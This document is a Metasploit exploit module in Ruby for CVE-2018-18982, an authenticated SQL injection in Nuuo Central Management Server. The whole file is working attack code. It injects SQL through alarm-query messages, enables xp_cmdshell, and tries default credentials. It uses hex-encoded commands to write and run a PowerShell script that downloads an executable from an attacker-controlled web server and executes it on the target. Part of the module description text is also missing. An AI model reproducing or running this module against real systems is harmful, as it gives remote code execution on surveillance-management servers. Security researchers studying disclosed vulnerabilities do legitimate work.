# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::Nuuo
  include Msf::Exploit::Remote::HttpServer

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Nuuo Central Management Authenticated SQL Server SQLi&#039;,
      &#039;Description&#039;     => %q{
      The Nuuo Central Management Server allows an authenticated user to query the state of the alarms.
      installed by default, xp_cmdshell can be enabled and abused to achieve code execution.
      This module will either use a provided session number (which can be guessed with an auxiliary
      module) or attempt to login using a provided username and password - it will also try the
      default credentials if nothing is provided.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Pedro Ribeiro <pedrib@gmail.com>&#039;  # Vulnerability discovery and Metasploit module
        ],
      &#039;References&#039;      =>
        [
          [ &#039;CVE&#039;, &#039;2018-18982&#039; ],
          [ &#039;URL&#039;, &#039;https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02&#039; ],
          [ &#039;URL&#039;, &#039;https://seclists.org/fulldisclosure/2019/Jan/51&#039; ],
          [ &#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/advisories/nuuo-cms-ownage.txt&#039; ]

        ],
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;Arch&#039;            => ARCH_X86,
      &#039;Stance&#039;          => Msf::Exploit::Stance::Aggressive,  # we need this to run in the foreground
      &#039;Targets&#039;         =>
        [
          [ &#039;Nuuo Central Management Server <= v2.10.0&#039;, {} ],
        ],
      &#039;Notes&#039;           =>
        {
          &#039;SideEffects&#039;   => [ ARTIFACTS_ON_DISK ]
        },
      &#039;Privileged&#039;      => false,  # we run as NETWORK_SERVICE
      &#039;DisclosureDate&#039;  => &#039;Oct 11 2018&#039;,
      &#039;DefaultTarget&#039;   => 0))
    register_options [
      Opt::RPORT(5180),
      OptInt.new(&#039;HTTPDELAY&#039;, [false, &#039;Number of seconds the web server will wait before termination&#039;, 10]),
      OptString.new(&#039;URIPATH&#039;, [true,  &#039;The URI to use for this exploit&#039;, "/#{rand_text_alpha(8..10)}"])
    ]
  end


  def inject_sql(sql, final = false)
    sql = [&#039;GETOPENALARM&#039;,"DeviceID: #{rand_text_numeric(4)}","SourceServer: &#039;;#{sql};-- ","LastOne: #{rand_text_numeric(4)}"]
    if final
      nucs_send_msg_async(sql)
    else
      nucs_send_msg(sql)
    end
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    unless @pl
      print_error("A request came in, but the payload wasn&#039;t ready yet!")
      return
    end
    print_good(&#039;Sending the payload to CMS...&#039;)
    send_response(cli, @pl)

    Rex.sleep(3)

    print_status(&#039;Executing shell...&#039;)
    inject_sql(create_hex_cmd("xp_cmdshell \"cmd /c C:\\windows\\temp\\#{@filename}\""), true)
    register_file_for_cleanup("c:/windows/temp/#{@filename}")
  end

  def create_hex_cmd(cmd)
    var = rand_text_alpha(2)
    hex_cmd = "declare @#{var} varchar(8000); select @#{var}=0x"
    cmd.each_byte { |b|
      hex_cmd << b.to_i.to_s(16)
    }
    hex_cmd << "; exec (@#{var})"
  end

  def primer
    # we need to roll our own here instead of using the MSSQL mixins
    # (tried that and it doesn&#039;t work)
    service_url = "http://#{srvhost_addr}:#{srvport}#{datastore[&#039;URIPATH&#039;]}"
    print_status("Enabling xp_cmdshell and asking CMS to download and execute #{service_url}")
    @filename = "#{rand_text_alpha_lower(8..10)}.exe"
    ps1 = "#{rand_text_alpha_lower(8..10)}.ps1"
    download_pl = %{xp_cmdshell }
    download_pl << %{&#039;cd C:\\windows\\temp\\ && }
    download_pl << %{echo $webclient = New-Object System.Net.WebClient >> #{ps1} && }
    download_pl << %{echo $url = "#{service_url}" >> #{ps1} && }
    download_pl << %{echo $file = "#{@filename}" >> #{ps1} && }
    download_pl << %{echo $webclient.DownloadFile($url,$file) >> #{ps1} && }
    download_pl << %{powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File #{ps1}&#039;}

    print_status(&#039;Injecting PowerShell payload&#039;)
    inject_sql("exec sp_configure &#039;show advanced options&#039;, 1; reconfigure; exec sp_configure &#039;xp_cmdshell&#039;, 1; reconfigure; " + create_hex_cmd(download_pl))
    register_file_for_cleanup("c:/windows/temp/#{ps1}")
  end

  def exploit
    nucs_login

    unless @nucs_session
      fail_with(Failure::Unknown, &#039;Failed to login to Nuuo CMS&#039;)
    end

    @pl = generate_payload_exe

    #do not use SSL
    if datastore[&#039;SSL&#039;]
      ssl_restore = true
      datastore[&#039;SSL&#039;] = false
    end

    begin
      Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) {super}
    rescue Timeout::Error
      datastore[&#039;SSL&#039;] = true if ssl_restore
    end
  end
end

